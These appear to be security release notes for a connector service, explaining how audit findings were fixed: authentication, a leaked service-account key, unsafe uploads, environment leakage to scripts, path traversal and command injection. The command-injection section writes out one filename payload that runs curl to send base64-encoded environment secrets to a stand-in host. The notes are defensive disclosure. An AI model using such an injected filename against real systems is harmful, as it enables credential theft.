# claude-connector v12.28.0

**Phase 0 security remediation** — audit `TNX-AUDIT-2026-08`, Section 8, Phase 0.

Treat this as incident response, not a routine release. Seven of the ten Critical
findings in the audit sit in this component.

---

## BREAKING CHANGES

Read this section before deploying. Three changes will stop the connector or
change caller behaviour.

### 1. `MCP_API_KEY` is now mandatory

The process refuses to bind its listener without it and exits non-zero.

```
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

Set the result as `MCP_API_KEY`, then present it on every request:

```
Authorization: Bearer <MCP_API_KEY>
```

`X-MCP-Api-Key: <MCP_API_KEY>` is accepted for clients that cannot set
`Authorization`. The query string is deliberately **not** a supported carrier.

Minimum length 32 characters. Placeholder values are rejected at boot.

### 2. `POST /data/upload-binary` is removed

It now returns `410 Gone`. Callers must use `POST /data/upload` with
`{ filename, content_base64, mime_type }`, which applies the extension
allowlist and denylist.

### 3. The bundled Google service-account key is gone

`data/google-service-account.json` has been deleted from the artifact and the
auto-load code path removed. Supply the credential through
`GOOGLE_SERVICE_ACCOUNT_KEY_FILE`, pointing at a path mounted from a secrets
manager. If it is unset, Drive is simply not configured.

### Also changed

- CORS no longer emits `Access-Control-Allow-Origin: *`. Set
  `MCP_ALLOWED_ORIGINS` to a comma-separated list, or leave it blank for a
  server-to-server deployment. A literal `*` is refused at boot.
- The global request body limit is now `2mb`. The former `50mb` applies only to
  `/mcp`, `/messages`, `/tool-call`, `/data/upload`, `/upload/connections`,
  `/brain-scan`, `/ti-skill-compile` and `/restore-*`.
- Unauthenticated `GET /health` returns a bare liveness payload. The full
  diagnostic response is unchanged for authenticated callers.
- Scripts spawned by `script_execute` no longer inherit the process
  environment. A script that relied on reading an API key from `os.environ`
  will now see `None`. See `SCRIPT_ENV_MANIFEST` below.

---

## Findings remediated

### TNX-C-001 — The MCP tool endpoint had no authentication (Critical)

`/sse`, `/messages` and `/mcp` read no credential of any kind. A search for
`MCP_API_KEY` across `src/` and `scripts/` returned zero matches, despite
`.env.example` describing it as strongly recommended and `render.yaml`
declaring it. Anyone able to resolve the connector hostname obtained the
complete tool surface: Google Drive read/write under a full `/auth/drive`
scope, Calendar, Sheets, WordPress publication, SMTP dispatch under the
organisation's domain, LinkedIn, arbitrary Python execution via
`script_execute`, and the persistent memory store.

This finding is the precondition that converted TNX-C-004, TNX-C-005,
TNX-C-009 and TNX-C-010 from local issues into remote, unauthenticated
compromise.

**Added** `src/middleware/mcpAuth.js`:

- Deny by default. Every route is authenticated unless it appears on the
  `PUBLIC_ROUTES` allowlist, and every entry there carries a written
  justification in the source.
- Comparison via SHA-256 digest and `crypto.timingSafeEqual`. Hashing first is
  required, not cosmetic: `timingSafeEqual` throws on a length mismatch, and
  that throw would itself be an oracle for the key length.
- `assertConfigured()` throws at boot when the key is absent, short, or a
  placeholder. There is deliberately no environment variable that disables it.
- `assertAllRoutesCovered()` walks the Express router stack and fails the boot
  if any route was registered ahead of the gate without being allowlisted. The
  defect class was not "someone forgot a check", it was "nothing verified that
  checks existed", so the verification is the remediation.
- `express-rate-limit`, previously a declared but entirely unused dependency,
  applied to `/mcp`, `/sse`, `/messages` and `/tool-call`.
- `trust proxy` set to a **hop count**, not `true`. Trusting all proxies would
  let a caller forge `X-Forwarded-For` and evade the limiter entirely.

Routes left public, each with the control that replaces the key: `/health`
(liveness probe), `/api/config.js` (public hostname), `/track/open` and
`/track/click` (fetched by arbitrary mail clients), `/auth/linkedin/callback`
(OAuth `state`), `/webhook` (`X-Webhook-Secret`), `/upload/connections`
(`UPLOAD_API_KEY`), `/memory/admin/dump` (`MEMORY_AUTH_TOKEN`), `/download/*`
and `/preview/*` (document token), `/data/upload` (extension policy).

**Known residual risk.** `/data/upload` remains unauthenticated. The browser
chat surface posts to it and cannot hold `MCP_API_KEY` without disclosing it.
The audit scoped only `/data/upload-binary` for removal and endorsed this
handler's extension policy as the control. Rate limiting and a size cap are now
applied. The durable fix is a short-lived per-session upload token minted by
the Gateway Service, scheduled as Phase 1 work.

### TNX-C-002 — A live Google service-account private key was committed (Critical)

`data/google-service-account.json` contained a complete, unredacted RSA private
key. `.dockerignore` was a five-line denylist that did not exclude it, so it was
copied into every image. `.env.example` actively encouraged the arrangement.

- Key file **deleted** from the artifact.
- Auto-load code path deleted from `src/config.js`, along with the
  now-orphaned `BUNDLED_GOOGLE_SERVICE_ACCOUNT_KEY_FILE` constant and the
  `existsSync` import it was the only consumer of.
- `.dockerignore` rewritten to an **allowlist**: exclude everything, then
  re-include `src/`, `package.json`, `package-lock.json` and `scripts/`, with
  trailing rules that exclude credential material under any filename. A
  denylist that must enumerate every secret filename will always eventually
  miss one, which is exactly what happened.
- `.env.example` and `README.md` corrected.
- `GOOGLE_DRIVE_SCOPES` guidance added recommending `drive.file` over full
  `/auth/drive`.

**OPERATOR ACTION STILL REQUIRED — this release does not do it for you:**

1. **Revoke the key** in Google Cloud Console, IAM & Admin, Service Accounts,
   Keys. Do this first, before deploying anything.
2. Audit Drive, Calendar and Sheets access logs for the key's entire lifetime.
3. Purge the file from Git history with `git filter-repo` or BFG. Deleting it
   in a new commit does not remove it from history or from any existing clone.
4. Rotate every other credential listed in `.env.example` that has been
   deployed, because TNX-C-004 exposed all of them to any executed script.

### TNX-C-003 — `/data/upload-binary` permitted unauthenticated arbitrary file write (Critical)

No token check, no extension policy, no size limit beyond the global 50 MB body
cap. It bypassed the sibling `/data/upload` handler entirely.

Three compounding effects: unauthenticated write of any file type to the
persistent volume including `.py`, `.sh` and `.exe`; no quota, so repeated
posts exhausted the volume shared with the memory store, schedule store and
download directory; and it was the primitive that created files whose *names*
contained shell metacharacters, completing the TNX-C-010 chain.

Endpoint deleted, returning `410 Gone` with the replacement named. A 404 would
have looked like a routing fault and invited retries. Global body limit reduced
from 50 MB to 2 MB with per-path exemptions.

### TNX-C-004 — `script_execute` passed the entire process environment (Critical)

`env: { ...process.env, PYTHONUNBUFFERED: '1' }` handed every spawned Python
script the complete credential set: `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`,
`DEEPSEEK_API_KEY`, `PERPLEXITY_API_KEY`, `XAI_API_KEY`, `MISTRAL_API_KEY`,
`GROQ_API_KEY`, `QWEN_API_KEY`, `BRAVE_API_KEY`, `TAVILY_API_KEY`,
`SERPER_API_KEY`, `GOOGLE_CLIENT_SECRET`, `GOOGLE_REFRESH_TOKEN`,
`SLACK_BOT_TOKEN`, `WP_APP_PASSWORD`, `MEMORY_AUTH_TOKEN`,
`RAILWAY_RESTORE_TOKEN`, `AVA_MEMORY_WP_KEY` and any database URL present.

A three-line script posting `os.environ` to an external host exfiltrated the
organisation's entire credential set. The module header's claim that
`spawnSync` "with explicit python3 binary — no shell execution" made this safe
addressed shell injection only; environment inheritance is a separate channel.

Replaced by `buildScriptEnv()`, which constructs the environment **from
scratch** rather than filtering `process.env`. This is the property that makes
the control durable: a secret added to the connector's environment in future is
excluded by default rather than included by default.

Where a script legitimately needs a secret, two variables must agree:
`SCRIPT_GRANTABLE_ENV` lists the names that *may* be granted at all, and
`SCRIPT_ENV_MANIFEST` maps a script path to the names it receives. A manifest
edit alone is insufficient, so the grant is a two-place, reviewable change.

Not in this release, scheduled for Phase 3: separate low-privilege UID,
`RLIMIT_AS` / `RLIMIT_NPROC` / `RLIMIT_FSIZE`, and a network-namespaced sandbox.

### TNX-C-005 — Path containment used prefix matching (Critical)

`String.prototype.startsWith` is a character-prefix test, not a directory
boundary test. With `SCRIPTS_BASE = /data/skill/ava/scripts`, the path
`/data/skill/ava/scripts_evil/payload.py` satisfied it and was accepted.

**Added** `src/utils/pathContainment.js`, using `path.relative` for the
boundary test. It also refuses symbolic links, which matters independently:
`path.resolve` is lexical and never touches the filesystem, so a symlink inside
the base pointing outside it passed every string-based check.

Applied at every path-context site in the component:

| Site | Previously |
|---|---|
| `tools/script-execute.js` script path | `startsWith( SCRIPTS_BASE )` |
| `tools/script-execute.js` output files | `startsWith( outputDir )` |
| `tools/skill-content.js` `readContentFile` | boundary-correct, but no symlink refusal |
| `tools/skill-content.js` `writeContentFile` | **no guard at all** |
| `server-http.js` `/download/:filename` | `basename()` only |
| `server-http.js` `/preview/:filename` | `basename()` only |

The read path in `skill-content.js` was protected while the write path was not,
which is the more consequential of the two.

### TNX-C-010 — Command injection in the document preview endpoint (Critical)

`execSync` invoked `/bin/sh -c` with the filename interpolated into a
double-quoted shell string. `basename()` removes directory separators; it does
not remove `"`, `;`, backtick, `$(`, `|` or `&`. A filename such as
`a";curl evil.test/$(cat /proc/self/environ|base64);"b.docx` broke out of the
quoting and executed as the `mcp` user, which owns the application source and
the `/data` volume.

- `execSync` replaced with `execFileSync`, which passes an argument array
  straight to `execve`. No shell is involved at any point, so shell
  metacharacters in a filename are inert data. This eliminates the class rather
  than filtering for it.
- Interpreter and script path are fixed deployment configuration resolved once
  at module load, never influenced by a request.
- `isSafeFilename()` enforces `^[A-Za-z0-9._-]{1,255}$` as an independent
  second layer, so a hostile filename created before this release is also
  refused.
- Token comparison moved from `===` to constant-time.
- Token now read from `Authorization` / `X-Document-Token` in preference to the
  query string, with `Referrer-Policy: no-referrer` so a previewed document
  cannot leak it onward. Query-string carriage is retained because these URLs
  are opened directly by a browser; short-lived signed URLs are Phase 3 work.
- Previews served under `Content-Security-Policy: sandbox` with neither
  `allow-scripts` nor `allow-same-origin`, plus explicit `script-src 'none'`
  and `X-Content-Type-Options: nosniff`. `allow-popups` and
  `allow-top-navigation-by-user-activation` are granted so the "Download
  Original" link still works; neither re-enables scripting.

### TNX-C-008 — CORS reflected arbitrary origins (Critical, configuration-dependent)

The connector set `Access-Control-Allow-Origin: *` unconditionally on every
route. Replaced with an explicit allowlist from `MCP_ALLOWED_ORIGINS`, with
origins normalised (lowercased, trailing slash stripped) so casing cannot be
used to bypass the list, `Vary: Origin` always set, and a literal `*` refused at
boot rather than honoured.

Baseline hardening headers added to every response: `X-Content-Type-Options`,
`Referrer-Policy`, and a `frame-ancestors` policy derived from the allowlist
rather than the previous `frame-ancestors *`.

### TNX-M-004 — `/health` enumerated configured integrations (Medium)

Included here because `/health` must remain publicly reachable and was the
reconnaissance aid the TNX-C-001 impact analysis specifically calls out. The
unauthenticated response is now a bare liveness signal; the full payload is
preserved verbatim for authenticated callers, so operator tooling is unaffected.

### TNX-H-009 — No secret scanning (High, partial)

`.gitleaks.toml` and `.githooks/pre-commit` added. The config extends the
gitleaks default ruleset and adds five platform-specific rules covering the
credential names in `.env.example`, including a rule that matches the exact
service-account JSON shape from TNX-C-002.

The hook is a convenience, **not** the control: it can be bypassed with
`--no-verify`. The same scan must run as a blocking CI step, which is Phase 2.

---

## Also in this release

`src/tools/skill-content.js` replaced with an updated implementation supplied by
the platform owner, carrying eight fixes: argument-key aliasing for the
`file` / `filename` / `path` drift between gateway call paths; a typed
`ToolValidationError` so client errors return a 400 shape instead of escaping to
the dispatcher as a 500; a content guard preventing `undefined` being written as
the literal string `"undefined"`; WordPress backup requests bounded by
`WP_SKILL_TIMEOUT_MS` (default 8000 ms) so a hanging endpoint cannot block a
write; a read-boundary traversal guard; and `.mjs`, `.cjs` and `.json` extension
support for the scripts section.

The TNX-C-005 containment work above was reapplied on top of it.

---

## Verification performed

24 automated tests in `src/tests/phase0-security.test.js`, all passing:

```
node --test src/tests/phase0-security.test.js
```

Coverage: containment against traversal, absolute paths, the sibling-directory
escape, symlinks and NUL bytes; filename validation against every shell
metacharacter `basename()` preserves; proof that no credential name reaches a
spawned script and that a manifest cannot grant an ungranted variable;
fail-closed boot assertions; middleware rejection of unauthenticated,
wrong-token and query-string-token requests; and a pinned assertion on the
public allowlist so adding an entry requires editing the test.

Two tests deliberately assert the *old* behaviour as well, so the suite records
why each fix exists rather than only that it works.

Additionally verified by hand: all 23 symbols `server-http.js` imports from
`skill-content.js` still resolve; the module loads at runtime; eight functional
tests covering read/write round-trips, key aliasing, the content guard, nested
subdirectories, the new `.mjs` extension and symlink refusal all pass; every
modified file passes `node --check`; and no live `startsWith` path check remains
in the component.

## Not in this release

`TNX-C-009` (SSRF in `web_fetch` and fourteen other URL-taking tools) is Phase 1
roadmap item 9. It is Critical and is the largest remaining exposure in this
component, but it requires a shared `safeFetch()` across fifteen modules and is
sequenced accordingly.
